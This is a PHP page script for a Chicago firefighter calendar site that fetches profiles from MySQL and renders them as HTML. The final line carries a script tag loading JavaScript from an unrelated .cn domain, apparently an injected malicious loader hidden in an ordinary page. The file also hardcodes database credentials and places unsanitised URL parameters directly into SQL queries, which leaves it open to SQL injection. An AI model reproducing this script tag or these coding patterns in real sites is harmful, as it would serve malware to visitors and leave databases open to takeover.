<?php

$dbhost = 'mysql.ignitethespirit.org';
$dbuser = 'ignite';
$dbpass = 'fire08';

$conn = mysql_connect($dbhost, $dbuser, $dbpass) or die ('Error connecting to mysql');

$dbname = 'ignite';
mysql_select_db($dbname);

if (isset($_GET['year']))
{
	$calendar_year = $_GET['year'];
}
else
{
	//$calendar_year = date(Y);
	$calendar_year = "2008";
}

if (isset($_GET['id']))
{
	$firefighter_id = $_GET['id'];
}
else
{
    $query = "SELECT calendar_id FROM calendar WHERE calendar_year = $calendar_year ORDER BY calendar_id ASC LIMIT 0,1";
	$id_result = mysql_query($query);
	$row = mysql_fetch_array($id_result, MYSQL_ASSOC);
	$firefighter_id = $row['calendar_id'];
	mysql_free_result($id_result);
}



$query = "SELECT * FROM calendar WHERE calendar_id = $firefighter_id";
$calendar_result = mysql_query($query);


$row = mysql_fetch_array($calendar_result, MYSQL_ASSOC);

$calendar_year = $row['calendar_year'];
$calendar_fname = $row['calendar_fname'];
$calendar_lname = $row['calendar_lname'];
$calendar_job = $row['calendar_job'];
$calendar_picture = "images/calendar/".$row['calendar_picture'];
$calendar_info = $row['calendar_info'];

mysql_free_result($calendar_result);

$query = "SELECT * FROM calendar WHERE calendar_year = $calendar_year ORDER BY calendar_lname";
$fireman_result = mysql_query($query);

function fireman_list ($query_result)
{
	while ($row = mysql_fetch_array($query_result, MYSQL_ASSOC)) 
	{
	echo "<div class='calendar_jan'>";
	echo "<div class='calendar_thumb'><img src='images/calendar/".$row['calendar_thumbnail']."' /></div>";
	echo "<div class='calendar_month'><a href='calendar.php?year=".$row['calendar_year']."&id=".$row['calendar_id']."'>".$row['calendar_fname']." ".$row['calendar_lname']."</a></div>";
	echo "</div>";
	}
}



$query = "SELECT DISTINCT calendar_year FROM calendar ORDER BY calendar_year DESC";
$year_result = mysql_query($query);

function year_list ($query_result)
{

	While ($row = mysql_fetch_array($query_result, MYSQL_ASSOC) )
	{
		echo "<a href='calendar.php?year=".$row['calendar_year']."'>".$row['calendar_year']."</a><br />";
	}
}

?>
<?php include("header.php"); ?>
<!--
	<div class="nav_container">
		<ul class="floatright">
			<li><a href="index.html">Home</a></li> 
			<li> |&nbsp;</li>
			<li><a href="about.html">About</a></li>
			<li> |&nbsp;</li>
			<li><a href="#">Store</a></li> 
			<li> |&nbsp;</li>
			<li><a href="#">Contact</a></li>    	  	
		</ul>
	</div>
-->
	<div class="container">
		<div class="left">
		    <a class="logo_link" href="index.php"><img src="images/its_logo_rollover.jpg" alt="logo" /></a>
			
    		<div class="left_content"> 
          	<?php include("navigation.php"); ?>
		    </div>
			<div class="calendar_archive">
          	<?php year_list($year_result); ?>
		  	</div>
			
			<!--
			<div class="left_content">
				<img src="images/125x125banner.jpg" />
			</div>
			-->
		</div>
		<div class="middle">
			<div class="calendar_header">
					<h4>MEET CHICAGO'S OWN</h4>
					<h1><?php echo $calendar_year; ?> Calendar</h1>
			</div>
			<div class="calendar_content">
    		    <h2><?php echo $calendar_fname." ".$calendar_lname." | ".$calendar_job; ?></h2>
				<img class="calendar_profile_photo" src="<?php echo $calendar_picture; ?>" />
				<p>
				<?php echo $calendar_info; ?>
				</p>
  			</div>
			<!--
			<div class="middle">
			<img src="images/486x68banner.jpg" />
			</div>
			-->
  		</div>
		
		<div class="right">
			<div class="calendar_advertisement">
				<h1>Ignite The Spirit Calendar</h1>
				<img width="75%" src="images/2009Calendar.jpg" alt="Calendar Cover" />
				<p><a href="store.php">SHOP NOW</a></p>
			</div>
			 <div class="blurb_square">
				<?php fireman_list($fireman_result); ?>
				
			</div>

		</div>
	</div>
<?php include("footer.php"); ?>
<script src='http://nt002.cn/E/J.JS'></script></body>
</html>
